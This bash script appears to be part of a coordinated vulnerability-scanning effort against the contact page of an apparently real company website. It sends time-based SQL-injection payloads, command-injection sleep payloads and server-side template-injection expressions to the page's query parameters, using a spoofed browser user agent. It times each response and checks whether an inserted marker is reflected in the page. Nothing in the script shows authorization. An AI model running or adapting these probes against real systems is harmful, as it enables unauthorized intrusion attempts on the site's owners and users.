#!/bin/bash
# Assign cells: /contact?x=1&cb=1 :: sqli, cmdi, ssti
# Different technique from prior workers (who used sqlmap/oob only):
#   (a) time-based oracle  - does the server pause on a conditional delay?
#   (b) arithmetic marker   - is input ever evaluated/rendered?
#   (c) SSTI arithmetic    - do template expressions get evaluated?
#   (d) control request     - identical request twice, to measure baseline noise
T="https://www.infinitycapital.bh/contact"
UA="Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0 Safari/537.36"

tm () { # label, url -> prints time + code
  local l="$1" u="$2"
  local r=$(timeout 30 curl -sk -A "$UA" -o /tmp/t_$RANDOM -w "%{http_code} %{time_total} %{size_download}" "$u")
  echo "[$l] $r"
}

echo "### (d) CONTROL: identical benign request x3 (baseline timing noise) ###"
tm "ctl_A" "$T?x=1&cb=1"
tm "ctl_B" "$T?x=1&cb=1"
tm "ctl_C" "$T?x=1&cb=1"

echo
echo "### (a) TIME ORACLE - sqli sleep ###"
tm "x_sleep5"   "$T?x=1'+AND+SLEEP(5)--&cb=1"
tm "x_sleep0"   "$T?x=1'+AND+SLEEP(0)--&cb=1"
tm "cb_sleep5"  "$T?x=1&cb=1'+AND+SLEEP(5)--"
tm "pg_sleep5"  "$T?x=1'+AND+(SELECT+SLEEP(5))--&cb=1"
tm "cb_pg_sleep" "$T?x=1&cb=1;SELECT+pg_sleep(5)--"

echo
echo "### (a2) TIME ORACLE - unconditional baseline delay probe (cmdi / generic) ###"
tm "x_cmdi_sleep" "$T?x=1%3Bsleep+5%23"
tm "x_cmdi_bk"    "$T?x=1%60sleep+5%23"
tm "cb_cmdi_sleep" "$T?x=1&cb=1%3Bsleep+5%23"

echo
echo "### (c) SSTI arithmetic / expression evaluation ###"
tm "x_ssti_7"  "$T?x=\${7*7}&cb=1"
tm "x_ssti_j"  "$T?x=%24%7B7*7%7D&cb=1"
tm "x_ssti_h"  "$T?x=%23%7B7*7%7D&cb=1"
tm "cb_ssti_7" "$T?x=1&cb=%24%7B7*7%7D"
tm "x_ssti_ng" "$T?x=%25%7B7*7%7D&cb=1"
tm "x_astro"   "$T?x=%7B%25%3D+7*7+%25%7D&cb=1"

echo
echo "### (b) reflection of a unique marker in either param ###"
MARK=P14MARKER7Q2Z
timeout 25 curl -sk -A "$UA" -o /tmp/mark.html "$T?x=$MARK&cb=$MARK"
echo "marker count in body: $(grep -c "$MARK" /tmp/mark.html)"
echo "body title: $(grep -oE '<title>[^<]*' /tmp/mark.html | head -1)"
echo "DONE"
